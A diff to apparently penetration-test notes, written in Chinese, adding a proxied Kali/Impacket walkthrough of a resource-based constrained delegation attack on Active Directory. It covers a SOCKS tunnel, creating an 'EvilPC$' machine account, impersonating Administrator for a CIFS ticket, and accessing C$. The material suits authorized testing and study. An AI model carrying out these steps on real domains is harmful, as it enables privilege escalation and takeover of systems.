@@ -78,3 +78,16 @@ $dn = (Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties DistinguishedName)
 dsacls "$dn" /I:T /R SME\aduser
 klist purge
 ```
+
+## 情境2 — 代理版（Kali/Impacket，Windows 端不執行程式）
+
+- 拓撲：Kali(172.31.44.17) → SSH 跳板(10.0.1.173) → DC(10.0.0.206) → 目標(EC2AMAZ-V903HM1.sme.local，例：10.0.2.200)
+- 代理：在 Kali 建 SOCKS5 `ssh -N -D 1080 jump@10.0.1.173`；proxychains 僅保留 `socks5 127.0.0.1 1080`
+- 環境：Impacket 以 venv `pip install -e .` 安裝；必要時降級 setuptools `<70` 以提供 `pkg_resources`
+- 正確步驟（摘要）：
+  1) 新增機器帳號 EvilPC$（SAMR/445）
+  2) 對目標寫入 RBCD（LDAP/389；或 389 + `-k`）
+  3) 以 EvilPC$ 取 TGT，然後 `getST -k` 拿 `Administrator → cifs/EC2AMAZ-V903HM1.sme.local` 服務票
+  4) 將 KRB5CCNAME 指向 `Administrator@cifs_...ccache`，用 `smbclient -k -no-pass -target-ip 10.0.2.200`
+  5) 驗證 shares、IPC$、C$
+- 完整流程與故障排查請見：[RBCD_Proxy_Path_Kali.md](file:///c:/Users/aduser/Desktop/PCT/94727/RBCD_Proxy_Path_Kali.md)
